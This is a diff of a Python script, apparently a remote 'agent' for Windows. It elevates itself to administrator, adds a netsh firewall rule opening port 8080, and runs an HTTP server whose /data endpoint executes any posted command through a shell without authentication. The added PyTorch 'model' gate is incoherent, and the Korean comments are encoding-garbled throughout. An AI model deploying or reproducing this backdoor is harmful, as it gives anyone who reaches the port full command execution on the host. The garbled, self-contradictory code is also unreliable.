@@ -5,20 +5,29 @@ import sys
 import ctypes
 import json
 import subprocess
+import torch
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-# ÇöÀç ½ÇÇà ÁßÀÎ »ç¿ëÀÚ°¡ °ü¸®ÀÚ ±ÇÇÑÀ» °¡Áö°í ÀÖ´ÂÁö È®ÀÎÇÕ´Ï´Ù.
+# ë”ë¯¸ PyTorch ëª¨ë¸ (ì‹¤ì œë¡œëŠ” ë³µì¡í•œ ëª¨ë¸ì„ ë¡œë“œí•  ìˆ˜ ìˆìŒ)
+class DummyModel(torch.nn.Module):
+    def forward(self, x):
+        return "exec" if x == "run something" else "unknown"
+
+# ëª¨ë¸ ë¡œë“œ
+model = DummyModel()
+
+# í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ ì‚¬ìš©ìê°€ ê´€ë¦¬ì ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-# ÇÁ·Î±×·¥À» °ü¸®ÀÚ ±ÇÇÑÀ¸·Î ½ÇÇàÇÕ´Ï´Ù.
+# í”„ë¡œê·¸ë¨ì„ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•©ë‹ˆë‹¤.
 def run_as_admin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
-# ¹æÈ­º® ±ÔÄ¢À» Ãß°¡ÇÏ¿© Æ¯Á¤ Æ÷Æ®¸¦ ¿­¾îÁİ´Ï´Ù.
+# ë°©í™”ë²½ ê·œì¹™ì„ ì¶”ê°€í•˜ì—¬ íŠ¹ì • í¬íŠ¸ë¥¼ ì—´ì–´ì¤ë‹ˆë‹¤.
 def add_firewall_rule(port):
     try:
         subprocess.run(f"netsh advfirewall firewall add rule name=\"Open Port {port}\" dir=in action=allow protocol=TCP localport={port}", shell=True, check=True)
@@ -26,17 +35,21 @@ def add_firewall_rule(port):
     except subprocess.CalledProcessError as e:
         print(f"Failed to add firewall rule for port {port}. Error: {e}")
 
-# ¿ÜºÎ¿¡¼­ Àü´Ş¹ŞÀº ¸í·É¾î¸¦ ½ÇÇàÇÏ°í °á°ú¸¦ ¹İÈ¯ÇÕ´Ï´Ù.
+# ì™¸ë¶€ì—ì„œ ì „ë‹¬ë°›ì€ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ê³  ê²°ê³¼ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.
 def exec_command(command, arg):
+    # PyTorch ëª¨ë¸ë¡œ ëª…ë ¹ ë¶„ì„
+    model_result = model(command)
+    if model_result == "unknown":
+        return {"status": "error", "message": "Unknown command"}
+
     try:
         result = subprocess.check_output(f"{command} {arg}", shell=True).decode('utf-8')
         return {"status": "success", "output": result}
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-# HTTP ¿äÃ»À» Ã³¸®ÇÏ´Â Å¬·¡½º
+# HTTP ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ” í´ë˜ìŠ¤
 class MyRequestHandler(BaseHTTPRequestHandler):
-    # GET ¿äÃ» Ã³¸®
     def do_GET(self):
         if self.path == "/ping":
             self.send_response(200)
@@ -44,7 +57,6 @@ class MyRequestHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"status": "success", "message": "Agent is alive"}).encode())
 
-    # POST ¿äÃ» Ã³¸®
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
@@ -53,7 +65,6 @@ class MyRequestHandler(BaseHTTPRequestHandler):
         if self.path == "/data":
             command = data.get("command")
             arg = data.get("arg")
-
             if command:
                 response = exec_command(command, arg)
             else:
@@ -66,17 +77,17 @@ class MyRequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(json.dumps(response).encode())
 
-# ¼­¹ö¸¦ ½ÇÇàÇÏ´Â ÇÔ¼ö
+# ì„œë²„ë¥¼ ì‹¤í–‰í•˜ëŠ” í•¨ìˆ˜
 def run_server(port=8080):
     server_address = ('', port)
     httpd = HTTPServer(server_address, MyRequestHandler)
     print(f"Server running on port {port}")
     httpd.serve_forever()
 
-# ¸ŞÀÎ ½ÇÇà ·ÎÁ÷
+# ë©”ì¸ ì‹¤í–‰ ë¡œì§
 if __name__ == "__main__":
     if is_admin():
-        add_firewall_rule(8080)  # 8080 Æ÷Æ®¸¦ ¹æÈ­º®¿¡ Ãß°¡
+        add_firewall_rule(8080)
         run_server()
     else:
         print("Trying to get admin privileges...")
